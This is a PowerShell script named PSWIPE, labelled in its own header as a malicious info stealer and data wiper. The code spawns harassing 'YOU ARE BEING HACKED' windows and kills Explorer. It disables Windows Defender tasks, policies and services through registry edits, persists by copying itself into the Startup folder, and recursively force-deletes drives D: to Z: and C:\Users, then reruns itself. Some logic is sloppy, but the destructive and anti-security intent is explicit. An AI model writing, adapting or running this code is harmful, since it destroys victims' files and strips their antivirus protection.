############################
#
#
#    Title: PSWIPE
#    @Author: Husam Abdalla
#
#    Malicious script:
#    Infor stealer and Data wiper.
#
#
#
#
############################

function getInfo(){

$host = hostname
$name = $env:USERNAME

}

function scareKrow(){

$obj = New-Object -ComObject 'wscript.shell'

for($i = 0; $i -lt 100; $i++){

        Start-Process cmd.exe

        $obj.sendKeys("YOU ARE BEING HACKED NOW!!!!!")

        sleep -Seconds 3

    }


}

function stopWindow(){

    Stop-Process -Name explorer

    Import-Module -DisableNameChecking $PSScriptRoot\..\lib\New-FolderForced.psm1
Import-Module -DisableNameChecking $PSScriptRoot\..\lib\take-own.psm1

Write-Output "Elevating priviledges for this process"
do {} until (Elevate-Privileges SeTakeOwnershipPrivilege)

$tasks = @(
    "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"
    "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup"
    "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"
    "\Microsoft\Windows\Windows Defender\Windows Defender Verification"
)

foreach ($task in $tasks) {
    $parts = $task.split('\')
    $name = $parts[-1]
    $path = $parts[0..($parts.length-2)] -join '\'

    Write-Output "Trying to disable scheduled task $name"
    Disable-ScheduledTask -TaskName "$name" -TaskPath "$path"
}

Write-Output "Disabling Windows Defender via Group Policies"
New-FolderForced -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" "DisableAntiSpyware" 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" "DisableRoutinelyTakingAction" 1
New-FolderForced -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender\Real-Time Protection"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender\Real-Time Protection" "DisableRealtimeMonitoring" 1

Write-Output "Disabling Windows Defender Services"
Takeown-Registry("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend")
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" "Start" 4
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" "AutorunsDisabled" 3
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisSvc" "Start" 4
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisSvc" "AutorunsDisabled" 3
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Sense" "Start" 4
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Sense" "AutorunsDisabled" 3

Write-Output "Removing Windows Defender context menu item"
Set-Item "HKLM:\SOFTWARE\Classes\CLSID\{09A47860-11B0-4DA5-AFA5-26D86198A780}\InprocServer32" ""

Write-Output "Removing Windows Defender GUI / tray from autorun"
Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" "WindowsDefender" -ea 0
    

}

function AddToStart(){

$current = pwd
$dest = 'C:\Packages'
$final = $env:USERPROFILE+'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

if(Test-Path -Path 'C:\Packages'){

    Copy-Item -Path 'PSWIPE.ps1' -Destination $dest

    } else{
    
        mkdir $dest
        Copy-Item -Path 'PSWIPE.ps1' -Destination $dest

    }

    Write-Output 'powershell.exe C:\Packages\PSWIPE.ps1' >> startup.cmd

    Copy-Item -Path 'startup.cmd' -Destination $final

}

function steal(){

$PATHS = {'D:\', 'E:\', 'F:\', 'G:\', 'H:\', 'I:\', 'J:\', 'K:\'
'L:\', 'M:\', 'N:\', 'O:\', 'P:\', 'Q:\', 'R:\', 'S:\', 'T:\', 'U:\', 'V:\'
'W:\', 'X:\', 'Y:\', 'Z:\'}

    for($i = 0; $i -lt $PATHS.count; $i++){
    
        if(Test-Path $PATHS[$i]){
            Remove-Item -Path * -Recurse -Force
        } else{
            Continue;
            }
    
    }

#$EXCLUDE = {'Program Files', 'Program Files (x86)', 'Windows', 'Packages', 'Users', 'Temp'}


    
    Get-ChildItem 'C:\' -Recurse | Tee-Object -FilePath 'C:\Packages\TREE.txt'

    cd 'C:\Users\'

    Remove-Item -Path * -Force -Recurse


}


###
###
###
###
###
###
###
###
###          START JOB::::
###
###
###
###
###
###
###
###
###
###
###

getInfo
AddToStart
scareKrow
stopWindow
steal

if(!$?){

    exit(0)

} else{

    ./PSWIPE

}